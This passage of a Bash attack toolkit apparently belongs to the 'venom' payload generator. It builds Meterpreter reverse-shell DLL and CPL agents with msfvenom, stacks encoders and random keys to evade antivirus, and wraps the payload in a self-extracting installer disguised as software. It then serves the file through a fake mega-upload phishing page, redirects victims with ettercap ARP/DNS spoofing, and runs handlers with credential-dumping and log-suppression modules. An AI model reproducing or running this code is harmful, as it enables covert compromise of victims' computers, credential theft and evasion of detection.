    echo ${GreenF}[✔]${white} linux_hostrecon.rb -> found${Reset};
    sleep 2
  else
    echo ${RedF}[x]${white} linux_hostrecon.rb -> not found${Reset};
    sleep 1
    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};
    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi

else

echo "nothing to do here" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "${BlueF}[☠]${white} loading -> Apache2Server!"${Reset};
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
        echo ${BlueF}[☠]${white} Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
          if [ "$MsFlF" = "ON" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
        echo ${BlueF}[☠]${white} Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


## CLEANING EVERYTHING UP
echo ${BlueF}[☠]${white} Cleanning temp generated files...${Reset};
mv $IPATH/templates/exec[bak].c $InJEc
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
sh_menu

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_menu
  clear
fi
}




# -----------------------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# mingw32 obfustated using astr0baby method and build installer.bat
# to use in winrar/sfx 'make payload executable by pressing on it'
# -----------------------------------------------------------------
sh_shellcode2 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
# input agent final name
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: astr0baby" --width 300) > /dev/null 2>&1
# chose agent final extension (.dll or .cpl)
Ext=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable agent extensions:\nThere is a niftty trick involving dll loading behavior under windows.\nIf we rename our agent.dll to agent.cpl we now have an executable\nmeterpreter payload that we cant doubleclick and launch it.." --radiolist --column "Pick" --column "Option" TRUE "$N4m.dll" FALSE "$N4m.cpl" --width 300 --height 150) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="astr0baby";fi
if [ "$Ext" = "$N4m.dll" ]; then
   Ext="dll"
else
   Ext="cpl"
fi


echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
sleep 1
echo "[☠] Building shellcode -> C format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi


echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
fi


echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc5 ]; then
      echo "[☠] exec_dll.c -> found!"
      sleep 2
   else
      echo "[☠] exec_dll.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   audit=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc5 $IPATH/templates/exec_dll[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates
# use SED to replace IpADr3 and P0rT
echo "[☠] Injecting shellcode -> $N4m.dll!"
sleep 2
sed -i "s|IpADr3|$lhost|g" exec_dll.c
sed -i "s|P0rT|$lport|g" exec_dll.c

# obfuscation ??
UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 150 | head -n 1)
sed -i "s|UUID-RANDOM|$UUID_1|g" exec_dll.c




echo "[✔] Using random UUID keys (evade signature detection)"
sleep 2
echo ""
echo "    Generated key:$UUID_1"
echo ""
sleep 1



if [ "$Ext" = "dll" ]; then
  # build winrar-SFX installer.bat script
  echo "[☠] Building winrar/SFX -> installer.bat..."
  sleep 2
  echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
  echo ":: this script will run payload using rundll32" >> $IPATH/output/installer.bat
  echo ":: ---" >> $IPATH/output/installer.bat
  echo "@echo off" >> $IPATH/output/installer.bat
  echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
  echo "rundll32.exe $N4m.dll,main" >> $IPATH/output/installer.bat
  echo "exit" >> $IPATH/output/installer.bat
  sleep 2
fi


# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling/obfuscating using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -lws2_32 -shared (dll) flag :D
$ComP exec_dll.c -o $N4m.dll -lws2_32 -shared
strip $N4m.dll

if [ "$Ext" = "dll" ]; then
   mv $N4m.dll $IPATH/output/$N4m.dll
else
   mv $N4m.dll $IPATH/output/$N4m.cpl
fi




# CHOSE HOW TO DELIVER YOUR PAYLOAD
if [ "$Ext" = "dll" ]; then
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.dll\n$IPATH/output/installer.bat\n\nExecute on cmd: rundll32.exe $N4m.dll,main\n\nchose how to deliver: $N4m.dll" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
else
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.cpl\n\nchose how to deliver: $N4m.cpl" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
fi


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


      # user settings
      if [ "$Ext" = "dll" ]; then
      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      else
      N4m2="$N4m.$Ext"
      fi

P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 310) > /dev/null 2>&1



  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.$Ext > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# and build installer.bat to use in winrar/sfx
# 'make payload executable by pressing on it'
# -------------------------------------------------
sh_shellcode3 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --title="☠ DLL NAME ☠" --text "example: DllExploit" --entry --width 300) > /dev/null 2>&1
# chose agent final extension (.dll or .cpl)
Ext=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable agent extensions:\nThere is a niftty trick involving dll loading behavior under windows.\nIf we rename our agent.dll to agent.cpl we now have an executable\nmeterpreter payload that we cant doubleclick and launch it.." --radiolist --column "Pick" --column "Option" TRUE "$N4m.dll" FALSE "$N4m.cpl" --width 300 --height 150) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="DllExploit";fi
if [ "$Ext" = "$N4m.dll" ]; then
   Ext="dll"
else
   Ext="cpl"
fi


echo "[☠] Building shellcode -> dll format ..."
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : DLL -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
# new obfuscating method
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -a x86 -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
fi
echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


if [ "$Ext" = "dll" ]; then
  echo "[☠] Injecting shellcode -> $N4m.dll!"
  sleep 2
  # build winrar-SFX installer.bat script
  echo "[☠] Building winrar/SFX -> installer.bat..."
  sleep 2
  echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
  echo ":: this script will run payload using rundll32" >> $IPATH/output/installer.bat
  echo ":: ---" >> $IPATH/output/installer.bat
  echo "@echo off" >> $IPATH/output/installer.bat
  echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
  echo "rundll32.exe $N4m.dll,main" >> $IPATH/output/installer.bat
  echo "exit" >> $IPATH/output/installer.bat
  sleep 2
else
  echo "[☠] Injecting shellcode -> $N4m.$Ext!"
  sleep 2
  mv $IPATH/output/$N4m.dll $IPATH/output/$N4m.$Ext
fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
if [ "$Ext" = "dll" ]; then
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.dll\n$IPATH/output/installer.bat\n\nExecute on cmd: rundll32.exe $N4m.dll,main\n\nchose how to deliver: $N4m.dll" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
else
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.cpl\n\nchose how to deliver: $N4m.cpl" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
fi


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log;  use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      if [ "$Ext" = "dll" ]; then
      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFORE CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
      else
      N4m2="$N4m.$Ext"
      fi

